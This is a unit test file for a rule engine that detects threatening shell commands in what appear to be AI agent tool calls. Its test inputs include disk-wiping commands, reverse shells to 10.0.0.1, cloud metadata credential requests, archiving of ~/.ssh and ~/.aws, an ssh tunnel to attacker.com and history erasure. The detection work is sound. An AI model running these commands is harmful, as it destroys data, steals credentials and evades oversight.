/**
 * Threat command detection rule unit tests.
 *
 * Covers: destructive commands, encoded payloads, reverse shells,
 * IMDS access, credential archiving, SSH tunnels, audit trail
 * destruction, and package publish.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { RuleEngine } from "../../dist/engine.js";
import {
  RULE_THREAT_DESTRUCTIVE_COMMAND,
  RULE_THREAT_ENCODED_PAYLOAD,
  RULE_THREAT_REVERSE_SHELL,
  RULE_THREAT_IMDS_ACCESS,
  RULE_THREAT_CREDENTIAL_ARCHIVE,
  RULE_THREAT_SSH_TUNNEL,
  RULE_THREAT_AUDIT_TRAIL_DESTRUCTION,
  RULE_THREAT_PACKAGE_PUBLISH,
} from "../../dist/rules/index.js";

function makeEvent(overrides = {}) {
  return {
    schema_version: 1,
    event_id: "evt-1",
    session_id: "sess-test",
    occurred_at: "2026-06-02T00:00:00.000Z",
    recorded_at: "2026-06-02T00:00:00.000Z",
    interceptor: "mock",
    event_type: "tool.invoked",
    tool_call_id: "tc-1",
    tool_name: "Bash",
    mcp_server: "builtin",
    parameters: {},
    ...overrides,
  };
}

// ---- DESTRUCTIVE COMMANDS ----

test("fires on rm -rf /", () => {
  const engine = new RuleEngine([RULE_THREAT_DESTRUCTIVE_COMMAND]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "rm -rf /" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
  assert.equal(findings[0].category, "threat_command");
  assert.ok(findings[0].description.includes("recursive-delete"));
});

test("fires on mkfs.ext4", () => {
  const engine = new RuleEngine([RULE_THREAT_DESTRUCTIVE_COMMAND]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "mkfs.ext4 /dev/sda1" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on dd to block device", () => {
  const engine = new RuleEngine([RULE_THREAT_DESTRUCTIVE_COMMAND]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "dd if=/dev/zero of=/dev/sda bs=4M" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on normal rm of a file", () => {
  const engine = new RuleEngine([RULE_THREAT_DESTRUCTIVE_COMMAND]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "rm temp.txt" },
  }));
  assert.equal(findings.length, 0);
});

// ---- ENCODED PAYLOADS ----

test("fires on base64 decode piped to bash", () => {
  const engine = new RuleEngine([RULE_THREAT_ENCODED_PAYLOAD]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "echo 'bWFsaWNpb3Vz' | base64 -d | bash" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
});

test("fires on python -c with exec", () => {
  const engine = new RuleEngine([RULE_THREAT_ENCODED_PAYLOAD]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "python3 -c 'exec(\"import os; os.system(\\\"id\\\")\")" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on normal base64 encode", () => {
  const engine = new RuleEngine([RULE_THREAT_ENCODED_PAYLOAD]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "echo 'hello' | base64" },
  }));
  assert.equal(findings.length, 0);
});

// ---- REVERSE SHELLS ----

test("fires on mkfifo + nc pattern", () => {
  const engine = new RuleEngine([RULE_THREAT_REVERSE_SHELL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "CRITICAL");
});

test("fires on bash -i /dev/tcp redirect", () => {
  const engine = new RuleEngine([RULE_THREAT_REVERSE_SHELL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on normal nc usage", () => {
  const engine = new RuleEngine([RULE_THREAT_REVERSE_SHELL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "nc -zv example.com 80" },
  }));
  assert.equal(findings.length, 0);
});

// ---- IMDS ACCESS ----

test("fires on curl to IMDS IPv4", () => {
  const engine = new RuleEngine([RULE_THREAT_IMDS_ACCESS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
});

test("fires on GCP metadata.google.internal", () => {
  const engine = new RuleEngine([RULE_THREAT_IMDS_ACCESS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on IMDS in fetch tool parameters", () => {
  const engine = new RuleEngine([RULE_THREAT_IMDS_ACCESS]);
  const findings = engine.evaluate(makeEvent({
    tool_name: "mcp__fetch__fetch",
    mcp_server: "fetch",
    parameters: { url: "http://169.254.169.254/latest/meta-data/" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on normal IP address", () => {
  const engine = new RuleEngine([RULE_THREAT_IMDS_ACCESS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "curl http://192.168.1.1/api" },
  }));
  assert.equal(findings.length, 0);
});

// ---- CREDENTIAL ARCHIVING ----

test("fires on tar of .ssh directory", () => {
  const engine = new RuleEngine([RULE_THREAT_CREDENTIAL_ARCHIVE]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "tar czf /tmp/keys.tar.gz ~/.ssh" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
});

test("fires on zip of .aws directory", () => {
  const engine = new RuleEngine([RULE_THREAT_CREDENTIAL_ARCHIVE]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "zip -r creds.zip ~/.aws" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on tar of project directory", () => {
  const engine = new RuleEngine([RULE_THREAT_CREDENTIAL_ARCHIVE]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "tar czf project.tar.gz ./src/" },
  }));
  assert.equal(findings.length, 0);
});

// ---- SSH TUNNELS ----

test("fires on ssh -R reverse tunnel", () => {
  const engine = new RuleEngine([RULE_THREAT_SSH_TUNNEL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "ssh -R 8080:localhost:80 user@attacker.com" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "MEDIUM");
});

test("fires on ssh -D SOCKS proxy", () => {
  const engine = new RuleEngine([RULE_THREAT_SSH_TUNNEL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "ssh -D 1080 user@proxy.example.com" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on normal ssh connection", () => {
  const engine = new RuleEngine([RULE_THREAT_SSH_TUNNEL]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "ssh user@server.example.com" },
  }));
  assert.equal(findings.length, 0);
});

// ---- AUDIT TRAIL DESTRUCTION ----

test("fires on history -c", () => {
  const engine = new RuleEngine([RULE_THREAT_AUDIT_TRAIL_DESTRUCTION]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "history -c" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
});

test("fires on rm .bash_history", () => {
  const engine = new RuleEngine([RULE_THREAT_AUDIT_TRAIL_DESTRUCTION]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "rm ~/.bash_history" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on shred of history", () => {
  const engine = new RuleEngine([RULE_THREAT_AUDIT_TRAIL_DESTRUCTION]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "shred -u ~/.bash_history" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on reading history", () => {
  const engine = new RuleEngine([RULE_THREAT_AUDIT_TRAIL_DESTRUCTION]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "cat ~/.bash_history | grep ssh" },
  }));
  assert.equal(findings.length, 0);
});

// ---- PACKAGE PUBLISH ----

test("fires on npm publish", () => {
  const engine = new RuleEngine([RULE_THREAT_PACKAGE_PUBLISH]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "npm publish" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "MEDIUM");
});

test("fires on cargo publish", () => {
  const engine = new RuleEngine([RULE_THREAT_PACKAGE_PUBLISH]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "cargo publish --dry-run && cargo publish" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on twine upload", () => {
  const engine = new RuleEngine([RULE_THREAT_PACKAGE_PUBLISH]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "twine upload dist/*" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on npm install", () => {
  const engine = new RuleEngine([RULE_THREAT_PACKAGE_PUBLISH]);
  const findings = engine.evaluate(makeEvent({
    parameters: { command: "npm install express" },
  }));
  assert.equal(findings.length, 0);
});
